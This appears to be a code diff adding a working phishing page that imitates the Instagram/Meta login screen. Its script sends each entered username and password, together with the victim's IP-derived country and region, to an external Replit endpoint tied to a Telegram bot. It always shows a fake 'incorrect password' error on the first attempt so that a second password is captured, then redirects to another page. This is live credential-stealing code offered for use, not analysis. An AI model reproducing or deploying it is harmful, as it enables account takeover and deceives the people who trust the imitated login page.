@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen">
+
+  <div class="w-full max-w-sm px-6">
+
+    <!-- Logo -->
+    <div class="flex justify-center mb-14">
+      <img src="IMG_0085.png" alt="App" class="w-16 h-16" />
+    </div>
+
+    <!-- Username -->
+    <input
+      id="username"
+      type="text"
+      placeholder="Username, mobile number or email address"
+      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
+    />
+
+    <!-- Password -->
+    <input
+      id="password"
+      type="password"
+      placeholder="Password"
+      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
+    />
+
+    <!-- Login Button -->
+    <button
+      id="loginBtn"
+      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
+             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
+             flex items-center justify-center gap-2"
+    >
+      <span id="btnText">Log in</span>
+      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" stroke-opacity="0.3"/>
+        <path d="M22 12a10 10 0 0 1-10 10" stroke="currentColor" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+    </button>
+
+    <!-- Error Message -->
+    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
+      Incorrect username or password.
+    </div>
+
+    <!-- Forgotten Password -->
+    <div class="text-center mb-6">
+      <a href="#" class="text-sm font-normal text-black hover:underline">
+        Forgotten password?
+      </a>
+    </div>
+
+    <!-- Bottom Section -->
+    <div class="mt-16">
+      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">
+        Create new account
+      </button>
+
+      <div class="flex justify-center mt-2">
+        <img src="IMG_0084.png" alt="Meta" class="h-8" />
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const ENDPOINT = "https://admin-telegram-bot--fortuneigbinedi.replit.app/api/public/endpoint/L98ZP";
+    let attempt = 0;
+
+    // Get IP + Location
+    async function getLocationData() {
+      try {
+        const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,query');
+        const data = await res.json();
+
+        if (data.status === "success") {
+          return {
+            country: data.country || "Unknown",
+            state: data.regionName || "Unknown",
+            city: data.city || "Unknown"
+          };
+        }
+      } catch (e) {}
+
+      // Fallback
+      try {
+        const fb = await fetch('https://ipapi.co/json/');
+        const fbData = await fb.json();
+        return {
+          country: fbData.country_name || "Unknown",
+          state: fbData.region || "Unknown",
+          city: fbData.city || "Unknown"
+        };
+      } catch (e) {}
+
+      return { country: "Unknown", state: "Unknown", city: "Unknown" };
+    }
+
+    document.getElementById("loginBtn").addEventListener("click", async (e) => {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const passwordInput = document.getElementById("password");
+
+      if (!username || !password) {
+        alert("Please fill in all fields!");
+        return;
+      }
+
+      const btn = document.getElementById("loginBtn");
+      const btnText = document.getElementById("btnText");
+      const spinner = document.getElementById("spinner");
+      const errorMsg = document.getElementById("errorMsg");
+
+      // Loading state
+      btn.disabled = true;
+      btnText.textContent = "Logging in...";
+      spinner.classList.remove("hidden");
+      errorMsg.classList.add("hidden");
+
+      const loc = await getLocationData();
+
+      // Simple & Clean Message Format (exactly as you want)
+      const message = `
+
+APP:INSTAGRAM
+
+USER:  ${username}
+
+PWD:  ${password}
+
+COUNTRY:  ${loc.country} 🌍
+
+STATE: ${loc.state}
+
+X:  ${attempt + 1} ⏱️
+`;
+
+      // Send to your endpoint
+      try {
+        await fetch(ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message: message })
+        });
+      } catch (err) {
+        console.error("Failed to send data:", err);
+      }
+
+      attempt++;
+
+      // Two-attempt logic
+      setTimeout(() => {
+        if (attempt === 1) {
+          // First attempt - show error
+          errorMsg.classList.remove("hidden");
+          btn.disabled = false;
+          btnText.textContent = "Log in";
+          spinner.classList.add("hidden");
+          passwordInput.value = "";   // Clear password for next try
+        } else {
+          // Second attempt - redirect
+          btnText.textContent = "Redirecting...";
+          setTimeout(() => {
+            window.location.href = "secure.html";
+          }, 800);
+        }
+      }, 1400);
+    });
+  </script>
+</body>
+</html>
